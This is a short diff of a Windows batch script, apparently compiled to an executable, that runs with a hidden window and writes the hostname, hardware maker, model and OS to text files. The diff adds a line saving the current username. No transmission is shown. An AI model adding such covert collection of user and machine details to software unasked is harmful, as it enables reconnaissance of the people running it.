@@ -26,7 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFDN9aCW7GV/0KpQs3MfLorzThR0+A8ASRKvU2aGDJe4H+XnRQcdjhkZckcUNACdfewa7bQY6r2EMs3yAVw==
+::Zh4grVQjdCyDJGyX8VAjFDN9aCW7GV/0KpQs3MfLorzThR0+A8ASRKvU2aGDJe4H+XnRQcdjhkZ8kcUNACdfewa7bQY6r2EMs3yAVw==
 ::YB416Ek+ZW8=
 ::
 ::
@@ -45,6 +45,7 @@ echo =============================
 MODE CON: COLS=30 LINES=10
 powershell -windows minimize -command ""
 hostname > pcname.txt
+whoami > username.txt
 wmic /output:mf.txt computersystem get manufacturer
 wmic /output:model.txt computersystem get model
 wmic /output:os.txt os get caption
